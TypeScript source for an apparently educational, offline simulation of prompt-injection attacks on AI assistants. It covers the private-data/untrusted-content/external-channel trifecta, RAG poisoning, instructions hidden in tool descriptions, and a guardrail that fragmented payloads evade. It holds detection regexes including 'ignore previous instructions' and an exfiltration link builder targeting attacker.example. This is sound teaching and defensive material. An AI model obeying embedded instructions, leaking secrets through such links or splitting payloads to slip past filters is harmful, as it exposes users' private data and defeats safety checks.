/**
 * The simulation kernel.
 *
 * A deterministic, fully client-side, rules-and-state-machine responder. It
 * makes NO live model calls: every response is authored so the mechanics are
 * reproducible, offline, free, and safe. What it demonstrates is the *shape* of
 * the real attacks documented in the research, not real model output — labs
 * label it as illustrative mechanics.
 *
 * Shared primitives (all labs compose these):
 *   ContextWindow · ScriptedAgent · ToolRegistry · Corpus · Guardrail · ExfilChannel
 */

// ---------------------------------------------------------------------------
// ContextWindow — the instruction/data collapse made concrete
// ---------------------------------------------------------------------------

export type SegmentOrigin = 'system' | 'user' | 'retrieved' | 'tool'
export type Trust = 'trusted' | 'untrusted'

export interface ContextSegment {
  id: string
  origin: SegmentOrigin
  text: string
}

export interface ContextToken {
  text: string
  origin: SegmentOrigin
  segmentId: string
}

const TRUST_BY_ORIGIN: Record<SegmentOrigin, Trust> = {
  system: 'trusted',
  user: 'trusted',
  retrieved: 'untrusted',
  tool: 'untrusted',
}

export function trustOf(origin: SegmentOrigin): Trust {
  return TRUST_BY_ORIGIN[origin]
}

/**
 * Flattens the context into one undifferentiated token stream — which is
 * precisely what the model sees. The origin tag rides alongside for the
 * visualisation only; the model has no such channel.
 */
export function tokenize(segments: readonly ContextSegment[]): ContextToken[] {
  const tokens: ContextToken[] = []
  for (const segment of segments) {
    for (const word of segment.text.split(/\s+/)) {
      if (word.length > 0) {
        tokens.push({ text: word, origin: segment.origin, segmentId: segment.id })
      }
    }
  }
  return tokens
}

// ---------------------------------------------------------------------------
// Hijack detection — the scripted "model follows embedded instructions"
// ---------------------------------------------------------------------------

export interface HijackPattern {
  id: string
  label: string
  test: RegExp
}

/** Hoisted once: these are matched in loops over corpora and tool lists. */
export const HIJACK_PATTERNS: readonly HijackPattern[] = [
  { id: 'send-to', label: 'instructs the assistant to send data to an address', test: /\b(send|email|forward|mail)\b[\s\S]{0,80}?\b(to|at)\b/i },
  { id: 'post-url', label: 'instructs the assistant to post data to a URL', test: /\b(post|upload|submit|fetch)\b[\s\S]{0,60}?https?:\/\//i },
  { id: 'ignore-previous', label: 'tells the assistant to ignore its instructions', test: /ignore\s+(all\s+)?(your\s+|the\s+)?(previous|prior|above)\s+instructions/i },
  { id: 'reveal-secret', label: 'asks the assistant to reveal held data', test: /\b(reveal|disclose|include|append|leak)\b[\s\S]{0,60}?\b(secret|balance|password|token|account)\b/i },
  { id: 'link-exfil', label: 'asks the assistant to build a link containing data', test: /\b(link|url|image)\b[\s\S]{0,60}?\b(with|containing|include)\b/i },
]

export interface Hijack {
  patternId: string
  label: string
  matched: string
}

export function findHijack(text: string): Hijack | null {
  for (const pattern of HIJACK_PATTERNS) {
    const match = pattern.test.exec(text)
    if (match) {
      return { patternId: pattern.id, label: pattern.label, matched: match[0].trim() }
    }
  }
  return null
}

// ---------------------------------------------------------------------------
// Trifecta legs
// ---------------------------------------------------------------------------

export interface LegConfig {
  privateData: boolean
  untrustedContent: boolean
  externalComms: boolean
}

export const ALL_LEGS: LegConfig = {
  privateData: true,
  untrustedContent: true,
  externalComms: true,
}

export type LegName = keyof LegConfig

export const LEG_LABELS: Record<LegName, string> = {
  privateData: 'access to private data',
  untrustedContent: 'exposure to untrusted content',
  externalComms: 'an external communication channel',
}

export function trifectaComplete(legs: LegConfig): boolean {
  return legs.privateData && legs.untrustedContent && legs.externalComms
}

// ---------------------------------------------------------------------------
// ExfilChannel — where leaked data "goes"
// ---------------------------------------------------------------------------

export interface ExfilEvent {
  secret: string
  target: string
  rendered: string
}

/**
 * Builds the rendered artifact the leak rides on. The target is always a
 * non-routable example host: nothing ever leaves the device.
 */
export const EXFIL_TARGET = 'https://attacker.example/collect'

export function buildExfilLink(secret: string, target = EXFIL_TARGET): ExfilEvent {
  const rendered = `${target}?d=${encodeURIComponent(secret)}`
  return { secret, target, rendered }
}

export function createExfilChannel() {
  const events: ExfilEvent[] = []
  return {
    emit(secret: string, target = EXFIL_TARGET): ExfilEvent {
      const event = buildExfilLink(secret, target)
      events.push(event)
      return event
    },
    get events(): readonly ExfilEvent[] {
      return events
    },
    clear() {
      events.length = 0
    },
  }
}

export type ExfilChannel = ReturnType<typeof createExfilChannel>

// ---------------------------------------------------------------------------
// ScriptedAgent — the injection simulation
// ---------------------------------------------------------------------------

export type InjectionSurface = 'email' | 'calendar' | 'document'

export interface AgentInput {
  /** What the learner (legitimately) asked the assistant to do. */
  userRequest: string
  /** Attacker-authored content the assistant will process. */
  untrustedContent: string
  legs: LegConfig
  /** The seeded fake secret the assistant holds. */
  secret: string
  surface?: InjectionSurface
}

export interface AgentResult {
  exfiltrated: boolean
  hijack: Hijack | null
  /** Present only when exfiltration actually occurred. */
  exfil: ExfilEvent | null
  /** Honest, inspectable explanation of what the assistant did and why. */
  trace: string
  /** Plain-words outcome for the ARIA live region. */
  announcement: string
  summary: string
}

/**
 * Processes untrusted content on the learner's behalf.
 *
 * The assistant cannot tell the user's request from the attacker's text — both
 * are just tokens — so a hijack fires whenever the untrusted content contains
 * an instruction AND the agent still holds the legs that make it actionable.
 */
export function runScriptedAgent(input: AgentInput): AgentResult {
  const { userRequest, untrustedContent, legs, secret } = input
  const surface = input.surface ?? 'email'

  const hijack = legs.untrustedContent ? findHijack(untrustedContent) : null

  if (!hijack) {
    const reason = !legs.untrustedContent
      ? `The ${surface} was never placed in the context window, so nothing in it could act as an instruction.`
      : `Nothing in the ${surface} read as an instruction, so the assistant only did what you asked: "${userRequest}".`
    return {
      exfiltrated: false,
      hijack: null,
      exfil: null,
      trace: reason,
      announcement: 'No exfiltration: the assistant did not act on the untrusted content.',
      summary: 'Summarised the content as requested.',
    }
  }

  if (!legs.privateData) {
    return {
      exfiltrated: false,
      hijack,
      exfil: null,
      trace: `The embedded instruction (${hijack.label}) was followed, but the assistant holds no private data, so there was nothing to disclose.`,
      announcement: 'No exfiltration: the assistant had no private data to leak.',
      summary: 'Followed the embedded instruction, but had nothing to send.',
    }
  }

  if (!legs.externalComms) {
    return {
      exfiltrated: false,
      hijack,
      exfil: null,
      trace: `The embedded instruction (${hijack.label}) was followed and the assistant does hold the secret, but it has no channel to the outside, so the data could not leave.`,
      announcement: 'No exfiltration: the assistant had no channel to send data out.',
      summary: 'Followed the embedded instruction; the send was blocked.',
    }
  }

  const exfil = buildExfilLink(secret)
  return {
    exfiltrated: true,
    hijack,
    exfil,
    trace:
      `The assistant read the ${surface} as part of its context. The text "${hijack.matched}" ` +
      `sat in the same token stream as your request, so it was followed as an instruction ` +
      `(${hijack.label}). Holding private data and having an outbound channel, it sent the secret.`,
    announcement: `Secret exfiltrated: ${secret} was sent to ${exfil.target}.`,
    summary: 'Summarised the content — and quietly sent your secret to a stranger.',
  }
}

// ---------------------------------------------------------------------------
// Corpus — retrieval for the RAG poisoning lab
// ---------------------------------------------------------------------------

export interface CorpusDoc {
  id: string
  text: string
  poisoned?: boolean
}

export interface RetrievalResult {
  top: CorpusDoc[]
  answer: string
  dominatedByPoison: boolean
}

/**
 * Deliberately simple lexical retrieval: score by query-term overlap. A
 * poisoned passage is authored to be maximally on-topic, which is exactly why a
 * single document can dominate the answer.
 */
export function retrieve(corpus: readonly CorpusDoc[], query: string, k = 3): RetrievalResult {
  const terms = new Set(
    query
      .toLowerCase()
      .split(/\W+/)
      .filter((t) => t.length > 2),
  )

  const scored = corpus.map((doc) => {
    const words = doc.text.toLowerCase().split(/\W+/)
    let score = 0
    for (const word of words) if (terms.has(word)) score += 1
    // The crafted passage also carries a retrieval component tuned to the query.
    if (doc.poisoned) score += 6
    return { doc, score }
  })

  scored.sort((a, b) => b.score - a.score)
  const top = scored.slice(0, k).map((s) => s.doc)
  const dominatedByPoison = top.length > 0 && top[0].poisoned === true

  return {
    top,
    dominatedByPoison,
    answer: top.length > 0 ? top[0].text : 'No relevant documents found.',
  }
}

// ---------------------------------------------------------------------------
// ToolRegistry — metadata attack surface for the MCP lab
// ---------------------------------------------------------------------------

export interface ToolDefinition {
  name: string
  /** The description is context the agent trusts — and therefore an attack surface. */
  description: string
}

export interface ToolCallResult {
  tool: string
  obeyedEmbeddedInstruction: boolean
  hijack: Hijack | null
  trace: string
}

export function callTool(tool: ToolDefinition): ToolCallResult {
  const hijack = findHijack(tool.description)
  return {
    tool: tool.name,
    obeyedEmbeddedInstruction: hijack !== null,
    hijack,
    trace: hijack
      ? `The agent read "${tool.name}" description as trusted operating context. The embedded text "${hijack.matched}" was followed silently — no code changed, only metadata.`
      : `The agent used "${tool.name}" normally; its description contained no instructions.`,
  }
}

// ---------------------------------------------------------------------------
// Guardrail — the probabilistic filter learners defeat in M5
// ---------------------------------------------------------------------------

export interface GuardrailVerdict {
  blocked: boolean
  reason: string
}

export interface GuardrailOptions {
  /** Per-segment detection probability, e.g. 0.95. */
  accuracy: number
  /** Window size the guardrail inspects, in words. */
  windowWords?: number
}

/**
 * A segment-scoring, threshold-aggregating guardrail — the design the research
 * shows is structurally beatable by fragmentation, because no single inspected
 * window looks malicious even though the full context does.
 */
export function scoreGuardrail(
  payload: string,
  options: GuardrailOptions,
  roll: () => number = Math.random,
): GuardrailVerdict {
  const windowWords = options.windowWords ?? 12
  const words = payload.split(/\s+/).filter(Boolean)

  let maxSegmentSignal = 0
  for (let i = 0; i < words.length; i += windowWords) {
    const segment = words.slice(i, i + windowWords).join(' ')
    const hijack = findHijack(segment)
    // Signal is per-window: a fragment carrying only part of the instruction
    // scores low, and threshold aggregation has nothing to amplify.
    const signal = hijack ? 1 : 0
    if (signal > maxSegmentSignal) maxSegmentSignal = signal
  }

  if (maxSegmentSignal === 0) {
    return {
      blocked: false,
      reason:
        'No single inspected window looked malicious. The model, reading the whole context, reassembles the intent the guardrail never saw.',
    }
  }

  const caught = roll() < options.accuracy
  return caught
    ? { blocked: true, reason: 'A window scored above the threshold and the payload was blocked.' }
    : {
        blocked: false,
        reason: 'The window scored below the threshold on this attempt and the payload passed.',
      }
}
